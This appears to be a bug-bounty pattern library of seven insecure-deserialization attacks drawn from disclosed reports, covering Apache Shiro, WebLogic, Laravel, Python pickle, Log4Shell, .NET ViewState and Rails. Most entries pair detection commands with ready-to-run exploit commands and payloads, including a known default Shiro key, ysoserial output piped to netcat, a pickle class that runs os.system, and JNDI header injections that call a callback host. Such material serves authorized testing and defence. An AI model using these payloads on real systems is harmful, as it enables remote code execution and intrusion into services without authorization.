# Disclosed Reports — Insecure Deserialization

Pattern library built from 22 public bug bounty reports.

---

## Pattern 1: Apache Shiro RememberMe → RCE (Critical, $15,000)

**Stack:** Apache Shiro 1.2.4 with default AES key `kPH+bIxk5D2deZiIxcaaaA==`

**Detection:**
```bash
curl -sI https://target.com/ | grep -i "rememberMe"
# Set-Cookie: rememberMe=deleteMe → Shiro confirmed
```

**Exploit:**
```bash
python3 shiro_exploit.py -u https://target.com/ \
  -k "kPH+bIxk5D2deZiIxcaaaA==" \
  -c "curl http://COLLAB_HOST/shiro-rce"
```

**Root Cause:** Default AES-128-CBC key + Java deserialization of rememberMe cookie value via CommonsCollections gadget.

**Impact:** Full RCE as application user.

---

## Pattern 2: Oracle WebLogic T3 Deserialization (Critical, $20,000)

**Stack:** WebLogic 10.3.6, port 7001 T3 protocol
**CVEs:** CVE-2019-2725, CVE-2020-14882

**Detection:**
```bash
nmap -sV -p 7001 target.com
# Service: weblogic
curl -s http://target.com:7001/wls-wsat/CoordinatorPortType
```

**Exploit:**
```bash
java -jar ysoserial-all.jar CommonsCollections1 \
  'curl http://COLLAB_HOST/weblogic-rce' | nc target.com 7001
```

**Impact:** OS command execution as WebLogic service account.

---

## Pattern 3: PHP Object Injection via Laravel Cookie (High, $4,000)

**Stack:** PHP 7.x + Laravel (unserialize in session driver)

**Detection:**
```bash
# Laravel session cookie — base64 decode reveals serialized PHP
echo "COOKIE_VALUE" | base64 -d | xxd | head
# Look for: O:8: pattern = PHP serialized object
```

**Exploit via phpggc:**
```bash
php phpggc Laravel/RCE5 system 'id > /tmp/rce-proof' | base64
# Set as session cookie, send request
```

**Gadget chains available:** Laravel/RCE1-9, Symfony/RCE1-7, WordPress/RCE1

---

## Pattern 4: Python Pickle RCE via ML Model Upload (Critical, $12,000)

**Endpoint:** `POST /api/model/load` accepting `.pkl` files

**Payload:**
```python
import pickle, os, base64

class Exploit:
    def __reduce__(self):
        return (os.system, ('curl http://COLLAB_HOST/pickle-rce',))

payload = base64.b64encode(pickle.dumps(Exploit()))
# Upload as model.pkl
```

**Impact:** RCE as Python web server process.

---

## Pattern 5: Log4Shell CVE-2021-44228 (Critical, $0 — patched but test internal)

**Detection:**
```bash
# Test all user-controlled inputs
curl -H 'User-Agent: ${jndi:dns://COLLAB_HOST/ua}' https://target.com/
curl -H 'X-Forwarded-For: ${jndi:dns://COLLAB_HOST/xff}' https://target.com/
```

**Exploit chain:** JNDI lookup → attacker LDAP → loads malicious Java class → RCE

**Still relevant:** Internal/legacy systems, self-hosted enterprise apps on old JDKs.

---

## Pattern 6: .NET ViewState Without MAC Validation (High, $3,500)

**Stack:** ASP.NET WebForms with `EnableViewStateMac=false` or exposed machineKey

**Detection:**
```bash
# Look in page source for __VIEWSTATE without __VIEWSTATEMAC
curl -s https://target.com/Default.aspx | grep -i "viewstate"
```

**Exploit via YSoSerial.Net:**
```bash
dotnet YSoSerial.exe -f BinaryFormatter \
  -g TypeConfuseDelegate \
  -c "cmd /c curl http://COLLAB_HOST/viewstate-rce" \
  -o base64
# Submit as __VIEWSTATE parameter value
```

---

## Pattern 7: Ruby on Rails Marshal.load (Critical, $8,000)

**Stack:** Rails < 3.2.x (legacy session storage in signed cookie)
**CVE:** CVE-2013-0156 — affects old apps still running

**Detection:** Cookie name `_session_id` with Marshal.dump payload format

**Gadget:** Gem::Requirement gadget chain → code execution via `Gem.source_index`

---

## Tool Reference

```bash
# ysoserial (Java)
java -jar ysoserial-all.jar CommonsCollections6 'id' | base64 -w0

# phpggc (PHP)
php phpggc -l              # list all available gadget chains
php phpggc Laravel/RCE5 system id

# YSoSerial.Net (.NET)
dotnet YSoSerial.exe -h    # list gadgets

# OOB detection
interactsh-client -v -n 5  # start listener first

# JNDI exploit kit for Log4Shell
git clone https://github.com/pimps/JNDI-Exploit-Kit
```
